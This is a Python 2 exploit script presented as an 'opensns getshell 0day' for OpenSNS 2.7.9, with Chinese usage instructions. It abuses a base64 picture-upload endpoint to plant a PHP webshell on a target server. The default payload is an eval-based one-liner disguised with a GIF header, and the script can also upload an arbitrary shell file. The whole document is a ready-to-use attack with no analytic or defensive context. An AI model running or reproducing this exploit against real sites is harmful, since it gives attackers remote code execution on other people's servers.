#!/usr/bin/env python
# -*- coding:utf-8 -*-
# opensns getshell 0day
# 当前版本:opensns2.7.9
# 时间：2016年5月30日

import requests
import argparse
from urlparse import urlparse, urlunparse, urljoin
import base64
import json
import traceback

banner = u'''\
# opensns getshell 0day
# 当前版本:opensns2.7.9
# 时间：2016年5月30日
#使用说明：
# 1、默认写入一句话:
    python exp.py -u http://xxx.xxx.xxx.xxx/index.php
# 2、上传指定的shell：
    python exp.py -u http://xxx.xxx.xxx.xxx/index.php -f /root/Desktop/myshell.php
'''
def getshell(url, file):
    # Gif89a <?php @eval($_POST['admin@123']);?>
    base64_file = "R2lmODlhCjw/cGhwIEBldmFsKCRfUE9TVFsnYWRtaW5AMTIzJ10pOz8+"
    try:
        try:
            if not (file is None):
                shellfile=open(file, 'rb')
                base64_file = base64.b64encode(shellfile.read())
                shellfile.close()
        except Exception,e:
            print "File Not Found."
            return
        urlinfo = urlparse(url)
        # ParseResult(scheme='http', netloc='127.0.0.1', path='/opensns/index.php', params='', query='', fragment='')
        path = ""
        if "index.php" not in urlinfo.path:
            path = "index.php"
        else:
            path = urlinfo.path
        posturl = urlunparse((urlinfo.scheme, urlinfo.netloc, path, '', '', ''))
        print banner
        print "[checking] " + posturl
        s = requests.session()
        base64_shell = 'data:image/php;base64,' + base64_file
        data = {'data': base64_shell}
        expposturl = posturl+"?s=/Core/File/Uploadpicturebase64.html"
        res = s.post(expposturl, data)
        decoded = json.loads(res.content)
        print "[getshell success]"
        print "SHELL: "+decoded['path']
    except Exception, e:
        print u"getshell failed..."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
parser.add_argument('-f', help='upload your webshell .')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    if not (args_dict['f'] == None):
        shellpath = args_dict['f']
    getshell(url, shellpath)
except Exception,e:
    print parser.print_usage()
    exit(-1)